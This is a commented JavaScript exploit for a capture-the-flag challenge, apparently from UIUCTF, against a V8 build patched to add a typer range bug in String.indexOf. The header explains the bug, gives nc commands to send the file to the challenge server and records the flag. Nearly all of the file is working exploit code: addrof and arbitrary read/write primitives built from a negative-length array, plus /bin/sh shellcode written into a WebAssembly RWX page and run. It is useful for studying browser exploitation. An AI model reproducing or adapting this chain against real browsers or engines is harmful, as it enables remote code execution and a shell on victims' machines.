/**
To Run:
$ (cat exploit.js;cat) | nc shouldve-had-a-v8.chal.uiuc.tf 1337
Or:
$ (cat exploit.js;cat) | ./v8-binary/v8_hello_wolrd

The cat magic is needed to keep stdin/out open so we can send our commands through after popping a
shell.

Provided patch introduces two changes: 
    1) A range error in the String.indexOf type (Range(-1, maxLength) was changed to 
       Range(0, maxLength) 
    2) A security mitigation that designed to prevent typer errors from causing out of bounds access
       was removed (removes a constant node that would normally be used as the array length in favor
       of calculating it dynamically).

When v8 jits a function, it does a range analysis on the values in it. This is done in the Typer
phase of turbofan (v8's jit compiler), and is where the the first bug is introduced.
`haystack.indexOf(needle)` returns -1 when the `needle` string is not present in the `haystack`
string, but the patch introduces a bug that causes the typer to the think the possible return values
are in Range(0, maxLength) (missing out the -1).

The goal then becomes abusing this in some way. v8 no longer completely eliminates bounds checks, so
we can't easily use this to index out of bounds backwards in an array. Instead, we'll make use of
the second part of the patch, a change in the TypedLowering phase. If turbofan can prove that a new 
Array will have a certain length, it will generate code to allocate the backing storage. and set the
new Array's length to a constant. The patch causes turbofan to re-use the result of the actual
calculate instead, letting us squeeze our -1 value through into the length field of an array. See
exploit() for details.

Now that we have oob access on the array, use it to set up standard addrof and arbitrary r/w
primitives. Use these to find the RWX page of a WASM module, write our shellcode, and then win.

Helpful links:
https://abiondo.me/2019/01/02/exploiting-math-expm1-v8/#javascript-exploitation-primitives
https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/
https://doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/

uiuctf{v8_go_brrrr_e72df103}
*/

/// Helper functions to convert between float and integer primitives
var buf = new ArrayBuffer(8); // 8 byte array buffer
var f64_buf = new Float64Array(buf);
var u64_buf = new Uint32Array(buf);

function ftoi(val) { // typeof(val) = float
    f64_buf[0] = val;
    return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 32n); // Watch for little endianness
}

function itof(val) { // typeof(val) = BigInt
    u64_buf[0] = Number(val & 0xffffffffn);
    u64_buf[1] = Number(val >> 32n);
    return f64_buf[0];
}

const ADDROF_OFFSET = 4;
const VICTIM_BUF_PTR_OFFSET = 23;
const FLOAT_ARR_OFFSET = 35;

function addrof(target) {
    // Returns the (compressed) address of the target object. Does this by using the oob array to
    // read the obj pointer on the victim object
    victim.obj = target;
    return ((ftoi(oob[ADDROF_OFFSET]) >> 32n) & 0xffffffffn);
}

function read64_compressed(addr) {
    // Read a 64bit quad from the given compressed pointer. Uses our oob to overwrite the elements 
    // pointer of float_arr, and then reads from that array. Because the pointer is 32 bits, and our
    // write is 64, we need to do some manipulation as to not overwrite anything else

    // Subtract 8 bytes to account for the header of the elements list
    const addr_high = (addr - 0x8n) << 32n;
    const curr_addr_high = ftoi(oob[FLOAT_ARR_OFFSET]);
    const new_addr_high = (addr_high >> 32n) | (curr_addr_high & 0xffffffff00000000n);
    oob[FLOAT_ARR_OFFSET] = itof(new_addr_high);

    return ftoi(float_arr[0])
}

function write(addr, data) {
    // Our OOB read/write is 8 bytes at a time, and it doesn't line up exactly with the 
    // address field of the victim buffer. So we need to do some finagling to write the
    // new address without clobbering other data. VICTIM_BUF_PTR_OFFSET was determined
    // experimentally.

    // Write lower half of new address
    const addr_low = addr & 0xffffffffn;
    const curr_addr_low = ftoi(oob[VICTIM_BUF_PTR_OFFSET]);
    const new_addr_low = (addr_low << 32n) | (curr_addr_low & 0xffffffffn);
    oob[VICTIM_BUF_PTR_OFFSET] = itof(new_addr_low);

    // Write upper bytes of new address
    const addr_high = addr & 0xffffffff00000000n;
    const curr_addr_high = ftoi(oob[VICTIM_BUF_PTR_OFFSET + 1]);
    const new_addr_high = (addr_high >> 32n) | (curr_addr_high & 0xffffffff00000000n);
    oob[VICTIM_BUF_PTR_OFFSET + 1] = itof(new_addr_high);

    // Now that the address has been correctly set, write data at that address
    let u8_buf = new Uint8Array(victim_buf);
    for (let i = 0; i < data.length; i++) {
        u8_buf[i] = data[i];
    }
}

function exploit(needle) {
    // Actual Range of i: [-1, stringMaxLength]
    // Calculated Range:  [0, stringMaxLength]
    let i = "abcdef".indexOf(needle);

    // Here the shift by 0x1d collapses the calculated range to [0, 0]. Since -1 >> 0x1d == -1, the 
    // actual range keeps the negative intact. This bit is needed as otherwise v8 will use a special
    // constant backing array it uses for empty arrays.
    // Actual Range of i: [-9, 1]
    // Calculated Range:  [1, 1]
    i = (i >> 0x1d) * 10 + 1;

    // Since it is thought the length is known exactly (calculated range is [1, 1]), when this part
    // is optimized the allocation will be inlined. Normally during the lowering the known value
    // would be replaced by a constant node, but the second part of the patch prevents this.
    a = new Array(i);

    // Coerce type of returned array to HOLEY_DOUBLE_ELEMENTS, so we can read out data as floats
    a[0] = 0.1;

    return a;
}

iters = 40000
// Trigger (incorrect) compilation of exploit
for (let i = 0; i < iters; i++) {
    exploit("f");
}

// oob will have a negative length (specifally -9)
const oob = exploit("g");

victim = { obj: {}, marker: 0x20a0a0 }; // used in addrof primitive
victim_buf = new ArrayBuffer(0x41); // used for arbitray write
float_arr = [0.1, 0.2, 0.3, 0.4, 0.5]; // used for reading from a compressed pointer

// Create rwx page for shellcode to go (stolen from https://github.com/r4j0x00/exploits/blob/master/chrome-exploit/exploit.js)
const wasm_code = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 4, 1, 96, 0, 0, 3, 2, 1, 0, 7, 9, 1, 5, 115, 104, 101, 108, 108, 0, 0, 10, 4, 1, 2, 0, 11]);
const mod = new WebAssembly.Module(wasm_code);
const wasm_instance = new WebAssembly.Instance(mod);
const shell = wasm_instance.exports.shell;

wasm_addr = addrof(wasm_instance);

// Get the rwx page from the wasm instance
rwx_addr = read64_compressed(wasm_addr + 0x68n);

// /bin/sh shellcode
shellcode = [106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5];

// Write shellcode, and run
write(rwx_addr, shellcode);
shell();

// END
